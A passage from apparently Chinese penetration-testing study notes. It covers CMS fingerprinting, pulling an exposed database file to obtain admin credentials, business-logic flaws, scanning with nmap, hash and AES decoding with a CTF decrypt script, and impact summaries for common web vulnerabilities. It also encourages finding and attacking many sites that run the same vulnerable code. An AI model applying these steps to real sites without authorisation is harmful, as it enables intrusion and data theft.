src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180121396.png" alt="image-20221018012112128" style="zoom:50%;" /><p><strong>根据下载的源码路径</strong>，尝试去访问网站目录 <a href="http://xxx.xxx.xxx.xxx:8003/xydata/xycms.mdb,%E4%B8%8B%E8%BD%BD%E5%88%B0%E6%96%87%E4%BB%B6">http://xxx.xxx.xxx.xxx:8003/xydata/xycms.mdb,下载到文件</a></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180121007.png" alt="image-20221018012139841"></p><p>尝试访问到后台  system或admin,根据刚才得到的管理员账号密码就可以登录</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180122786.png" alt="image-20221018012209479" style="zoom:50%;" /><h5 id="平台识别-某CMS有漏洞-漏洞利用"><a href="#平台识别-某CMS有漏洞-漏洞利用" class="headerlink" title="平台识别-某CMS有漏洞-漏洞利用"></a>平台识别-某CMS有漏洞-漏洞利用</h5><p>先判断网站程序</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180122377.png" alt="image-20221018012230093" style="zoom:50%;" /><p>根据底部信息去网站搜索漏洞，告诉你对应网站的版本，就去Google对应版本的漏洞，找不到漏洞的时候就去找源码，康康能不能有突破口</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180122467.png" alt="image-20221018012258240" style="zoom:50%;" /><p>根据搜索到的漏洞提示来进行安全测试攻击，如果网上没有漏洞信息，也可以下载程序再做漏洞分析</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180123300.png" alt="image-20221018012314066" style="zoom:50%;" /><h4 id="不同类型的源码具有不同特点的漏洞"><a href="#不同类型的源码具有不同特点的漏洞" class="headerlink" title="不同类型的源码具有不同特点的漏洞"></a>不同类型的源码具有不同特点的漏洞</h4><blockquote><p>往往功能越多漏洞也就越多</p></blockquote><h5 id="niushop电商类关注漏洞点——业务逻辑漏洞较多"><a href="#niushop电商类关注漏洞点——业务逻辑漏洞较多" class="headerlink" title="niushop电商类关注漏洞点——业务逻辑漏洞较多"></a>niushop电商类关注漏洞点——<strong>业务逻辑漏洞较多</strong></h5><p>把购买产品数量改成-1</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180123665.png" alt="image-20221018012333300" style="zoom:50%;" /><p>结果付款是0</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180123782.png" alt="image-20221018012359565" style="zoom:50%;" /><h4 id="从识别到源码获取的攻击"><a href="#从识别到源码获取的攻击" class="headerlink" title="从识别到源码获取的攻击"></a>从识别到源码获取的攻击</h4><h5 id="本地演示个人博客-手工发现其CMS-漏洞搜索或下载分析"><a href="#本地演示个人博客-手工发现其CMS-漏洞搜索或下载分析" class="headerlink" title="本地演示个人博客-手工发现其CMS-漏洞搜索或下载分析"></a>本地演示个人博客-手工发现其CMS-漏洞搜索或下载分析</h5><p>右键-检查源代码，通过对网站数据包的请求，看一下在请求网站的时候有哪些文件名和特殊的文件</p><p>再去搜索引擎检索特殊的文件，，，</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180124158.png" alt="image-20221018012419826" style="zoom:50%;" /><p>在google搜索</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180124016.png" alt="image-20221018012438646" style="zoom:50%;" /><p>亦或者知晓版本后直接搜索对应版本漏洞，一般框架漏洞没找到就去找源码</p><p>当某个版本的某些框架或者网站模板存在漏洞的时候，可以去查看网站的关键的目录或者文件</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210172308212.png" alt="image-20221017230804979" style="zoom:50%;" /><p>在network中查看一些特殊的文件，根据这些文件在搜索引擎或者网络空间搜索引擎中去查找这些特殊目录或者文件，很容易就能找到相同框架的网站，这些网站大概率存在相同的漏洞，这个时候，就可以日站了</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210172308322.png" alt="image-20221017230831105" style="zoom:50%;" /><p>很简单的就看到了相同框架的网站</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210172309991.png" alt="image-20221017230947541" style="zoom: 33%;" /><blockquote><p>简而言之就是同一套程序源码或者框架漏洞，得到源码之后，可以批量的复刻去攻击很多其他的网站，刚起步的违法网站都是这种小型的网站，大型网站才会自己搞（注重安全），会黑产呢大多数都是相同类似的，很容易被拿下</p></blockquote><h1 id="系统-amp-数据库"><a href="#系统-amp-数据库" class="headerlink" title="系统&amp;数据库"></a>系统&amp;数据库</h1><p>除去搭建平台中间件，网站源码外，容易受到攻击的还有操作系统，数据库，第三方软件平台等，其中此类攻击也能直接影响到Web或服务器的安全，导致网站或服务器权限的获取。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180124070.png" alt="image-20221018012457820" style="zoom:50%;" /><h3 id="操作系统层面"><a href="#操作系统层面" class="headerlink" title="操作系统层面"></a>操作系统层面</h3><h4 id="操作系统层面漏洞类型对应意义"><a href="#操作系统层面漏洞类型对应意义" class="headerlink" title="操作系统层面漏洞类型对应意义"></a>操作系统层面漏洞类型对应意义</h4><ul><li>覆盖面广</li><li>获取的权限高</li><li>危害性大,比如ms17010</li></ul><h4 id="操作系统层面漏洞影响范围"><a href="#操作系统层面漏洞影响范围" class="headerlink" title="操作系统层面漏洞影响范围"></a>操作系统层面漏洞影响范围</h4><p>利用漏洞去获取权限或者对某些服务进行干扰</p><h4 id="识别操作系统常见方法"><a href="#识别操作系统常见方法" class="headerlink" title="识别操作系统常见方法"></a>识别操作系统常见方法</h4><blockquote><a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/0x05-%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html" title="0x05 - 外网信息收集">0x05 - 外网信息收集</a></blockquote><h3 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h3><h4 id="识别数据库类型常见方法"><a href="#识别数据库类型常见方法" class="headerlink" title="识别数据库类型常见方法"></a>识别数据库类型常见方法</h4><blockquote><a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/0x05-%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html" title="0x05 - 外网信息收集">0x05 - 外网信息收集</a></blockquote><h4 id="数据库类型区别及识别意义"><a href="#数据库类型区别及识别意义" class="headerlink" title="数据库类型区别及识别意义"></a>数据库类型区别及识别意义</h4><ul><li>数据库的漏洞和类型相性很强，但写法结构都有些许不一样</li><li>不同数据库漏洞爆发点不太一样</li><li>能确定数据库类型、版本，会对渗透有很大帮助</li></ul><h4 id="数据库常见漏洞类型及攻击"><a href="#数据库常见漏洞类型及攻击" class="headerlink" title="数据库常见漏洞类型及攻击"></a>数据库常见漏洞类型及攻击</h4><blockquote><p>一般数据库漏洞较少，都是通过弱口令</p><ul><li>弱口令</li><li>sql注入</li></ul></blockquote><h4 id="数据库层面漏洞影响范围"><a href="#数据库层面漏洞影响范围" class="headerlink" title="数据库层面漏洞影响范围"></a>数据库层面漏洞影响范围</h4><p>得到网站管理员数据可<strong>登录后台</strong>，<strong>得到用户数据</strong>能登录用户信息，进行修改，通过数据库操作可进行<strong>漏洞攻击</strong>，也可以<strong>获取数据库权限和网站权限</strong></p><blockquote><p>要参考数据库的重要程度来判定影响范围</p></blockquote><h3 id="第三方层面"><a href="#第三方层面" class="headerlink" title="第三方层面"></a>第三方层面</h3><h4 id="如何判断有哪些第三方平台或软件"><a href="#如何判断有哪些第三方平台或软件" class="headerlink" title="如何判断有哪些第三方平台或软件"></a>如何判断有哪些第三方平台或软件</h4><p>多层次判断，不能仅限于端口扫描，根据不同的应用采取不同的方法。（比较大的知识点） </p><p>比如说有的第三方软件直接假设在网站上，通过访问网站目录使用，这种情况就nmap扫不出来第三方软件（比如说phpmyadmin</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -O -sV IP</span><br></pre></td></tr></table></figure><h4 id="简要为什么要识别第三方平台或软件"><a href="#简要为什么要识别第三方平台或软件" class="headerlink" title="简要为什么要识别第三方平台或软件"></a>简要为什么要识别第三方平台或软件</h4><h4 id="常见第三方平台或软件漏洞类型及攻击"><a href="#常见第三方平台或软件漏洞类型及攻击" class="headerlink" title="常见第三方平台或软件漏洞类型及攻击"></a>常见第三方平台或软件漏洞类型及攻击</h4><h4 id="简要第三方平台或软件安全测试的范围"><a href="#简要第三方平台或软件安全测试的范围" class="headerlink" title="简要第三方平台或软件安全测试的范围"></a>简要第三方平台或软件安全测试的范围</h4><h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><p>除去常规WEB安全及APP安全测试外，类似服务器单一或复杂的其他服务(邮件、游戏、负载均衡等)也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题。所以明确安全测试思路是很重要的！</p><h3 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h3><h4 id="攻击mysql"><a href="#攻击mysql" class="headerlink" title="攻击mysql"></a>攻击mysql</h4><p>靶场vulhub上面有</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180445917.png" alt="image-20221018044502691" style="zoom:50%;" /><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -O -sV IP</span><br><span class="line">扫出mysql开放</span><br></pre></td></tr></table></figure><p>msf攻击很简单 </p><h1 id="加密编码算法"><a href="#加密编码算法" class="headerlink" title="加密编码算法"></a>加密编码算法</h1><p>在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备。</p><blockquote><p><a href="https://cloud.tencent.com/developer/article/1748394">30余种加密编码类型的密文特征分析（建议收藏）</a></p></blockquote><h3 id="常见加密编码等算法解析"><a href="#常见加密编码等算法解析" class="headerlink" title="常见加密编码等算法解析"></a>常见加密编码等算法解析</h3><p>MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等</p><blockquote><ul><li>MD5：16位和32位，加密密文字符串由A-Z,0-9随机分配，80%网站管理员或用户密码加采取MD5加密。(不可逆)。有时候md5在网站中解密不出来，可能是带了盐，并非解密不出来</li><li>SHA：由A-Z，0-9随机组合，SHA1,SHA256,SHA384,SHA512长度固定。(不可逆)</li><li>进制：就是简单进制转换，碰上的机会不是很大。</li><li>时间戳：网站或者服务器脚本语言里经常会使用，会在数据库里用户登录、注销、注册里会使用。可用工具将其转化为正常时间</li><li>URL：浏览器只做一次编码，在渗透绕过的时候可能会使用二次，三次加密方式。burp该包的时候也需要注意到url编码问题</li><li>BASE64：由A-Z,0-9，A-Z区分大小写，长度固定，长度随密文长度依次增加，经常在字符串后按出现一个’&#x3D;’或者’&#x3D;&#x3D;’，<strong>甚至可能没有等于号</strong>，一般明文很少的时候就没有。常见的代码里、密码，参数值可能会被编码处理，在WEB应用中。</li><li>Unescape：%u+4位数字，对应两位字符，主要应用WEB应用上。</li></ul><blockquote><p><strong>Escape&#x2F;Unescape加密解码&#x2F;编码解码</strong>,又叫%u编码，从以往经验看编码字符串出现有”u”，它是unicode编码，那么Escape编码采用是那一种unicode实现形式呢。其实是UTF-16BE模式。这样一来问题非常简单了。 <strong>Escape编码&#x2F;加密</strong>,就是字符对应UTF-16 16进制表示方式前面加%u。<strong>Unescape解码&#x2F;解密</strong>，就是去掉”%u”后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”，反之也一样！因为目前%字符，常用作URL编码，所以%u这样编码已经逐渐被废弃了！</p></blockquote><ul><li><p>AES：是一种安全的加密方式，涉及到密码，偏移量，数据块，填充，在加密时候涉及到4种随机性。解密难度大。<strong>用base64解密出来是乱码，有很大可能是AES加密</strong>。有时候&#x2F;出现在字符串里面。比较注重安全和大型网站、安全比赛。<u>AES加密有时候会出现<code>/</code>在字符串中</u></p><p>AES解密的话，需要得到<strong>密码、偏移量</strong>、填充方式、数据块（密码和偏移量是一定不能少的）</p></li><li><p>DES：类似于BASE64，但有时候+会出现字符串里。<u>DES加密有时候会出现<code>+</code>在字符串中间</u></p></li></ul><blockquote><p>AES和DES均属于对称加密，</p><p>常见的非对称加密还有RSA，DSA</p></blockquote><ul><li><p>NTLM：这种加密是Windows的哈希密码，是 Windows NT 早期版本的标准安全协议。与它相同的还有Domain Cached Credentials（域哈希）。</p></li><li><p>HTML实体编码：HTML 实体是一段以连字号（&amp;）开头、以分号（;）结尾的文本（字符串）。实体常常用于显示保留字符（这些字符会被解析为 HTML 代码）和不可见的字符（如“不换行空格”）。你也可以用实体来代替其他难以用标准键盘键入的字符。</p></li></ul></blockquote><h3 id="常见加密形式算法解析"><a href="#常见加密形式算法解析" class="headerlink" title="常见加密形式算法解析"></a>常见加密形式算法解析</h3><blockquote><p>直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p><p>很多时候，比较复杂的没有找到盐啊、偏移量啊什么的，不要去想解密，基本不可能</p></blockquote><h3 id="常见解密方式-针对"><a href="#常见解密方式-针对" class="headerlink" title="常见解密方式(针对)"></a>常见解密方式(针对)</h3><blockquote><p>枚举，自定义逆向算法，可逆向</p></blockquote><h3 id="了解常规加密算法的特性"><a href="#了解常规加密算法的特性" class="headerlink" title="了解常规加密算法的特性"></a>了解常规加密算法的特性</h3><blockquote><p>长度位数，字符规律，代码分析，搜索获取等</p></blockquote><blockquote><p><a href="https://cloud.tencent.com/developer/article/1748394">30余种加密编码类型的密文特征分析（建议收藏）</a></p></blockquote><h3 id="演示："><a href="#演示：" class="headerlink" title="演示："></a>演示：</h3><h4 id="某CTF比赛题目解析"><a href="#某CTF比赛题目解析" class="headerlink" title="某CTF比赛题目解析"></a>某CTF比赛题目解析</h4><h5 id="脚本自定义算法组合逆向"><a href="#脚本自定义算法组合逆向" class="headerlink" title="脚本自定义算法组合逆向"></a>脚本自定义算法组合逆向</h5><blockquote><p>加密脚本</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">    <span class="comment">#print $key;</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span> (<span class="variable">$key</span>);</span><br><span class="line">    <span class="comment">#print $len;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span> ;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span> += <span class="number">1</span>;</span><br><span class="line">        <span class="comment">#print $key[$X];</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#print $char[0].$char[1].$char[2];</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span> ((<span class="title function_ invoke__">ord</span> (<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="title function_ invoke__">ord</span> (<span class="variable">$char</span>[<span class="variable">$i</span>]))%<span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span> (<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="string">&#x27;helloword&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>自定义解密算法脚本，就是江米脚本反过来写</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$mkey</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">    <span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$mkey</span>);</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$str</span>;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$tmp</span>);         <span class="comment">//解密base64</span></span><br><span class="line">    <span class="variable">$md_len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$tmp</span>);            <span class="comment">//获取输入加密字符长度</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$char</span> = <span class="string">&quot;&quot;</span>;                         <span class="comment">//临时数组</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$md_len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)&#123;               <span class="comment">//当加密字符串长度超出key</span></span><br><span class="line">             <span class="variable">$x</span> = <span class="number">0</span>;                    <span class="comment">//的长度时查重头开始和获取    </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$mkey</span>[<span class="variable">$x</span>];             <span class="comment">//.= 累积函数</span></span><br><span class="line">        <span class="variable">$x</span> += <span class="number">1</span>;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    <span class="variable">$md_data</span> = <span class="keyword">array</span>();                 <span class="comment">//获取加密字符中的ASCII数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$md_len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$md_data</span>,<span class="title function_ invoke__">ord</span>(<span class="variable">$tmp</span>[<span class="variable">$i</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$md_data_source</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$data1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$data2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$md_data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;<span class="comment">//最终还原</span></span><br><span class="line">        <span class="variable">$i</span> = <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span> &gt;= <span class="title function_ invoke__">strlen</span>(<span class="variable">$mkey</span>))&#123;</span><br><span class="line">            <span class="variable">$i</span> = <span class="variable">$i</span> - <span class="title function_ invoke__">strlen</span>(<span class="variable">$mkey</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$dd</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$od</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$mkey</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$md_data_source</span>,<span class="variable">$dd</span>);</span><br><span class="line">        <span class="variable">$data1</span> .=<span class="title function_ invoke__">chr</span>((<span class="variable">$dd</span>+<span class="number">128</span>)-<span class="variable">$od</span>);        <span class="comment">//原数据加key的Ascii大于128</span></span><br><span class="line">        <span class="variable">$data2</span> .=<span class="title function_ invoke__">chr</span>(<span class="variable">$dd</span>-<span class="variable">$od</span>);              <span class="comment">//原数据加key的Ascii小于128</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;data1 =&gt;&quot;</span>.<span class="variable">$data1</span>.<span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;data2 =&gt;&quot;</span>.<span class="variable">$data2</span>.<span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;HxclIiEqIiUY&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">decrypt</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="某CMS密码加密解密"><a href="#某CMS密码加密解密" class="headerlink" title="某CMS密码加密解密"></a>某CMS密码加密解密</h4><h5 id="MD5-salt"><a href="#MD5-salt" class="headerlink" title="MD5+salt"></a>MD5+salt</h5><blockquote><p>出现在部分CMS密码的加密之中，——wp,dz（discuz论坛、wordpress）等</p></blockquote><p>MD5</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180511213.png" alt="image-20221018051148031" style="zoom:50%;" /><p>单纯用MD5节目是无法解密成功</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180512492.png" alt="image-20221018051208275" style="zoom:50%;" /><p>有时候md5加密带了盐，此时要用MD5+salt</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180512379.png" alt="image-20221018051222159" style="zoom:50%;" /><p>解密成功。</p><blockquote><p><code>md5(md5($pass)$salt)</code>基本上无解，复杂度非常之高，没有盐根本找不到</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180512038.png" alt="image-20221018051237820" style="zoom:50%;" /><h4 id="某URL加密地址的漏洞测试"><a href="#某URL加密地址的漏洞测试" class="headerlink" title="某URL加密地址的漏洞测试"></a>某URL加密地址的漏洞测试</h4><h5 id="AES-Base64-自定义"><a href="#AES-Base64-自定义" class="headerlink" title="AES+Base64+自定义"></a>AES+Base64+自定义</h5><blockquote><p>观察参数值加密字符串，下载源代码分析，函数定义AES加密，设计模式CBC，128位，加密密码，偏移量，两次base64减去常规一次，填充模式。</p></blockquote><blockquote><p>墨者学院</p><blockquote><p>此WEB业务环境对参数进行了AES加密，为了防止参数产生SQL注入，也是防止SQL注入产生的一种方法，但是这种方式就安全了么？</p></blockquote></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180512991.png" alt="image-20221018051257668" style="zoom: 33%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180513306.png" alt="image-20221018051310074" style="zoom:33%;" /><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180513124.png" alt="image-20221018051323944"></p><p>下载list.zip</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180513081.png" alt="image-20221018051340882" style="zoom:50%;" /><p>打开查看，数据块，AES加密模式，密码，偏移量，两次base64加密</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180513121.png" alt="image-20221018051358872" style="zoom:50%;" /><p>先进行base64解密</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180514386.png" alt="image-20221018051418139" style="zoom:50%;" /><p>再进行AES解密</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180514754.png" alt="image-20221018051434525" style="zoom: 33%;" /><h4 id="某实际应用URL地址参数加密"><a href="#某实际应用URL地址参数加密" class="headerlink" title="某实际应用URL地址参数加密"></a>某实际应用URL地址参数加密</h4><blockquote><p>在实际网站之中，有很多的那种网址url参数进行了加密，这个时候我们直接用工具对之测试注入点是坑定不会有结果的！！！你得要将注入的语句也进行相应的加密传参，才能进行测试！</p></blockquote><p>搜索特定关键字加密字符串</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180514065.png" alt="image-20221018051452782" style="zoom: 33%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180515450.png" alt="image-20221018051508106" style="zoom: 33%;" /><h3 id="加密解密编码解码工具"><a href="#加密解密编码解码工具" class="headerlink" title="加密解密编码解码工具"></a>加密解密编码解码工具</h3><p>工具很多选几个合适的就行</p><blockquote><p>集成了各个网站的加密解密工具：</p><p>链接：<a href="https://pan.baidu.com/s/1A5Jjc-spYBKlKiPNbaetbQ">https://pan.baidu.com/s/1A5Jjc-spYBKlKiPNbaetbQ</a> 提取码：8eh7 </p></blockquote><blockquote><ul><li><a href="https://www.cmd5.com(带批量解密工具)/">https://www.cmd5.com（带批量解密工具）</a></li></ul><blockquote><p>cmd5g爱网站虽然有的要收费，但是其功能非常的多，不同形式的加盐，以及不同的cms常见的md5加密方式，比如说dicuz，mybb，joomla等等</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180720216.png" alt="image-20221018072045929" style="zoom:50%;" /></blockquote><ul><li><a href="https://www.somd5.com/">https://www.somd5.com/</a></li><li><a href="http://tool.chacuo.net/cryptaes">在线AES加密解密、AES在线加密解密、AES encryption and decryption</a></li><li><a href="https://cmd5.com/">https://cmd5.com/</a></li><li><a href="https://ares-x.com/tools/runtime-exec">RUNTIME.EXEC PAYLOAD GENERATER</a></li><li><a href="http://www.ttmd5.com/list.php%EF%BC%88%E5%B8%A6%E6%89%B9%E9%87%8F%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7%EF%BC%89">http://www.ttmd5.com/list.php（带批量解密工具）</a></li><li><a href="https://www.toolhelper.cn/">https://www.toolhelper.cn/</a></li><li><a href="https://www.somd5.com/batch.html">https://www.somd5.com/batch.html</a></li><li><a href="https://www.ddosi.org/code/#recipe=Generate_all_hashes()">https://www.ddosi.org/code/#recipe=Generate_all_hashes()</a></li><li><a href="https://www.5axxw.com/tools/web/encrypt/encrypt.html">https://www.5axxw.com/tools/web/encrypt/encrypt.html</a></li><li><a href="https://shijianchuo.net/encrypt/hash">https://shijianchuo.net/encrypt/hash</a></li><li><a href="http://tool.geekapp.cn/">http://tool.geekapp.cn/</a></li><li><a href="https://www.sojson.com/hash.html">https://www.sojson.com/hash.html</a></li><li><a href="http://tool.geekapp.cn/decrypt.php">http://tool.geekapp.cn/decrypt.php</a></li></ul></blockquote><h1 id="Web漏洞层面漏洞"><a href="#Web漏洞层面漏洞" class="headerlink" title="Web漏洞层面漏洞"></a>Web漏洞层面漏洞</h1><blockquote><p>右边的相对重要一点</p></blockquote><img src="https://cdn.nlark.com/yuque/0/2021/png/1272951/1621404562734-73932250-6c99-44bf-b2d2-744d102ebbe9.png?x-oss-process=image%2Fresize%2Cw_928%2Climit_0" alt="WEB漏洞.png" style="zoom:50%;" /><h3 id="简要说明以上漏洞危害情况"><a href="#简要说明以上漏洞危害情况" class="headerlink" title="简要说明以上漏洞危害情况"></a>简要说明以上漏洞危害情况</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><blockquote><ol><li>攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。</li><li>可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。</li><li>如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。</li><li>经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。</li></ol></blockquote><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><blockquote><ol><li>窃取管理员帐号或Cookie，入侵者可以冒充管理员的身份登录后台。使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。</li><li>窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作</li><li>网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马</li><li>发送广告或者垃圾信息。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用</li></ol></blockquote><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><blockquote><ol><li>读取任意文件</li><li>执行系统命令</li><li>探测内网端口</li><li>攻击内网网站</li></ol></blockquote><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><blockquote><p>如果 Web应用程序存在上传漏洞 , 攻击者甚至可以将一个webshell直接上传到服务器上 </p></blockquote><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><blockquote><p>（可能含有文件包含的漏洞：inurl:php?file&#x3D;）</p><ol><li>web服务器的文件被外界浏览导致信息泄露</li><li>脚本被任意执行，可能会篡改网站、执行非法操作、攻击其他网站</li></ol></blockquote><h4 